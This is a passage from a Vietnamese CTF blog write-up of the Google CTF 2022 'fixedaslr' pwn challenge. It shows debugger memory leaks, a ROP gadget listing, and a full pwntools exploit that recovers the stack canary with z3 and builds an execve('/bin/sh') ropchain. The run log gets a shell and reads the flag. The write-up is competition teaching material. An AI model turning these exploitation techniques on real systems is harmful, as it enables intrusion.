</span></span><span style="display:flex;"><span>0x0000f2b0000048│+0x0040: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x0000f2b0000050│+0x0048: 0x0000000000000000
</span></span></code></pre></div><p>3 địa chỉ vừa leak có thể dùng làm offset để leak thêm 1 vài địa chỉ nữa. Mình ví dụ địa chỉ <code>0x00009580000000</code> vừa leak được</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  telescope 0x00009580000000
</span></span><span style="display:flex;"><span>0x00009580000000│+0x0000: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x00009580000008│+0x0008: 0x0000db4000119c  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x00009580000010│+0x0010: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x00009580000018│+0x0018: 0x0000db400011f2  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x00009580000020│+0x0020: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x00009580000028│+0x0028: 0x00004080001000  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x00009580000030│+0x0030: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x00009580000038│+0x0038: 0x0000db40001ac5  →  0xe5894855fa1e0ff3
</span></span><span style="display:flex;"><span>0x00009580000040│+0x0040: 0xcccc0000000225ff
</span></span><span style="display:flex;"><span>0x00009580000048│+0x0048: 0x00004080001000  →  0xe5894855fa1e0ff3
</span></span></code></pre></div><p>Cứ tiếp tục làm như vậy thì ta có thể leak được 6 base address của các file object (main.o, syscalls.o, guard.o, basic.o, game.o, res.o). Vậy làm sao để có được địa chỉ base address thứ 7 (debug.o)? Well, here comes some crypto magic from my teammate. Đồng đội mình đã giúp mình recover lại canary và tìm luôn địa chỉ của <code>debug.o</code>. Chút nữa mình sẽ để trong script solve cuối cùng.</p>
<h2 id="ropchain">Ropchain<a hidden class="anchor" aria-hidden="true" href="#ropchain">#</a></h2>
<p>Sau khi có được canary và địa chỉ <code>debug.o</code> thì mọi thứ đã trở nên đơn giản. Mình sẽ build 1 ropchain <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> để spawn shell. Các gadgets cần thiết thì đã có trong vùng address của <code>debug.o</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  x/40i 0x0000e3e0000000+0x1000
</span></span><span style="display:flex;"><span>   0xe3e0001000:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001001:	pop    rdi
</span></span><span style="display:flex;"><span>   0xe3e0001002:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001003:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001004:	pop    rsi
</span></span><span style="display:flex;"><span>   0xe3e0001005:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001006:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001007:	pop    rax
</span></span><span style="display:flex;"><span>   0xe3e0001008:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001009:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e000100a:	pop    rbx
</span></span><span style="display:flex;"><span>   0xe3e000100b:	ret    
</span></span><span style="display:flex;"><span>   0xe3e000100c:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e000100d:	pop    rcx
</span></span><span style="display:flex;"><span>   0xe3e000100e:	ret    
</span></span><span style="display:flex;"><span>   0xe3e000100f:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001010:	pop    rdx
</span></span><span style="display:flex;"><span>   0xe3e0001011:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001012:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001013:	pop    rsp
</span></span><span style="display:flex;"><span>   0xe3e0001014:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001015:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001016:	pop    rbp
</span></span><span style="display:flex;"><span>   0xe3e0001017:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001018:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001019:	pop    r8
</span></span><span style="display:flex;"><span>   0xe3e000101b:	ret    
</span></span><span style="display:flex;"><span>   0xe3e000101c:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e000101d:	pop    r9
</span></span><span style="display:flex;"><span>   0xe3e000101f:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001020:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001021:	pop    r10
</span></span><span style="display:flex;"><span>   0xe3e0001023:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001024:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001025:	pop    r11
</span></span><span style="display:flex;"><span>   0xe3e0001027:	ret    
</span></span><span style="display:flex;"><span>   0xe3e0001028:	push   rdi
</span></span><span style="display:flex;"><span>   0xe3e0001029:	pop    r12
</span></span><span style="display:flex;"><span>   0xe3e000102b:	ret    
</span></span><span style="display:flex;"><span>   0xe3e000102c:	push   rdi
</span></span></code></pre></div><h2 id="final-script-1">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./loader&#39;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;fixedaslr.2022.ctfcompetition.com&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_addr</span>(idx):
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendline(str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> int(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_index</span>(start):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((start <span style="color:#f92672">-</span> game_score_board_addr) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_o <span style="color:#f92672">=</span> get_addr(<span style="color:#ae81ff">512</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2000</span>
</span></span><span style="display:flex;"><span>game_score_board_addr <span style="color:#f92672">=</span> main_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> get_index(main_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
</span></span><span style="display:flex;"><span>game_o <span style="color:#f92672">=</span> get_addr(idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1111</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> get_index(main_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>)
</span></span><span style="display:flex;"><span>guard_o <span style="color:#f92672">=</span> get_addr(idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> get_index(game_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
</span></span><span style="display:flex;"><span>basic_o <span style="color:#f92672">=</span> get_addr(idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x119c</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> get_index(guard_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
</span></span><span style="display:flex;"><span>syscalls_o <span style="color:#f92672">=</span> get_addr(idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1064</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> get_index(game_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2000</span>)
</span></span><span style="display:flex;"><span>res_o <span style="color:#f92672">=</span> get_addr(idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;main.o        : &#39;</span> <span style="color:#f92672">+</span> hex(main_o))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;syscalls.o    : &#39;</span> <span style="color:#f92672">+</span> hex(syscalls_o))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;guard.o       : &#39;</span> <span style="color:#f92672">+</span> hex(guard_o))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;basic.o       : &#39;</span> <span style="color:#f92672">+</span> hex(basic_o))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;game.o        : &#39;</span> <span style="color:#f92672">+</span> hex(game_o))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;res.o         : &#39;</span> <span style="color:#f92672">+</span> hex(res_o))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>known_states <span style="color:#f92672">=</span> [main_o <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span>, syscalls_o <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span>, guard_o <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span>, basic_o <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span>, game_o <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span>, res_o <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Known states: </span><span style="color:#e6db74">{</span>known_states<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rand_state <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rand_extract_bit</span>(a):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> rand_state
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (rand_state <span style="color:#f92672">&gt;&gt;</span> a) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rand_get_bit</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> rand_state
</span></span><span style="display:flex;"><span>	x <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>		rand_extract_bit(<span style="color:#ae81ff">0x3F</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">^</span> rand_extract_bit(<span style="color:#ae81ff">0x3D</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">^</span> rand_extract_bit(<span style="color:#ae81ff">0x3C</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">^</span> rand_extract_bit(<span style="color:#ae81ff">0x3A</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>	rand_state <span style="color:#f92672">=</span> ((rand_state <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">64</span>)) <span style="color:#f92672">|</span> x
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rand</span>(n):
</span></span><span style="display:flex;"><span>	x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>		y <span style="color:#f92672">=</span> rand_get_bit()
</span></span><span style="display:flex;"><span>		x <span style="color:#f92672">=</span> (x <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> y
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> known_state <span style="color:#f92672">in</span> known_states:
</span></span><span style="display:flex;"><span>	s<span style="color:#f92672">.</span>add(rand(<span style="color:#ae81ff">12</span>) <span style="color:#f92672">==</span> known_state)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>recovered_canary <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> s<span style="color:#f92672">.</span>check() <span style="color:#f92672">==</span> sat:
</span></span><span style="display:flex;"><span>	model <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
</span></span><span style="display:flex;"><span>	recovered_canary <span style="color:#f92672">=</span> model[BitVec(<span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#ae81ff">64</span>)]<span style="color:#f92672">.</span>as_long()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Recovered canary: &#39;</span> <span style="color:#f92672">+</span> hex(recovered_canary))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rand_state <span style="color:#f92672">=</span> recovered_canary
</span></span><span style="display:flex;"><span>debug_o <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
</span></span><span style="display:flex;"><span>    debug_o <span style="color:#f92672">=</span> rand(<span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>debug_o <span style="color:#f92672">=</span> debug_o <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;debug.o       : &#39;</span> <span style="color:#f92672">+</span> hex(debug_o))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">12</span>):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;How much is &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    equation <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> eval(equation)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(res)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1000&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> debug_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1004</span>
</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> debug_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1010</span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> debug_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1007</span>
</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> syscalls_o <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1002</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(recovered_canary)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3b</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf/fixedaslr $ python3 solve.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to fixedaslr.2022.ctfcompetition.com on port 1337: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> main.o        : 0x1640000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> syscalls.o    : 0x2c40000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> guard.o       : 0x5d40000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> basic.o       : 0x72f0000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> game.o        : 0xcc0000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> res.o         : 0xeca0000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Known states: <span style="color:#f92672">[</span>356, 708, 1492, 1839, 204, 3786<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Recovered canary: 0xc12b162013d71ab7
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> debug.o       : 0xf880000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> nobody nogroup  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span> 05:52 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> nobody nogroup  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span> 05:52 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">5040</span> Jul  <span style="color:#ae81ff">1</span> 21:48 basic.o
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">1664</span> Jul  <span style="color:#ae81ff">1</span> 21:48 debug.o
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup    <span style="color:#ae81ff">46</span> Jul  <span style="color:#ae81ff">1</span> 21:48 flag
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">7280</span> Jul  <span style="color:#ae81ff">1</span> 21:48 game.o
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">1416</span> Jul  <span style="color:#ae81ff">1</span> 21:48 guard.o
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> nobody nogroup <span style="color:#ae81ff">15376</span> Jul  <span style="color:#ae81ff">1</span> 21:48 loader
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">2088</span> Jul  <span style="color:#ae81ff">1</span> 21:48 main.o
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">1184</span> Jul  <span style="color:#ae81ff">1</span> 21:48 res.o
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> nobody nogroup  <span style="color:#ae81ff">3056</span> Jul  <span style="color:#ae81ff">1</span> 21:48 syscalls.o
</span></span><span style="display:flex;"><span>$ cat flag
</span></span><span style="display:flex;"><span>CTF<span style="color:#f92672">{</span>GuessYouCanSayTheCookieGotRandomlyBroken<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>$ 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to fixedaslr.2022.ctfcompetition.com port <span style="color:#ae81ff">1337</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://pivik271.github.io/posts/corctf2022/">
    <span class="title">« Prev</span>
    <br>
    <span>corCTF 2022 - corchat, nbd</span>
  </a>
  <a class="next" href="https://pivik271.github.io/posts/asisquals2021/">
    <span class="title">Next »</span>
    <br>
    <span>ASIS QUALS - Just pwn it, ABBR, StrVec</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://pivik271.github.io/">pivik</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
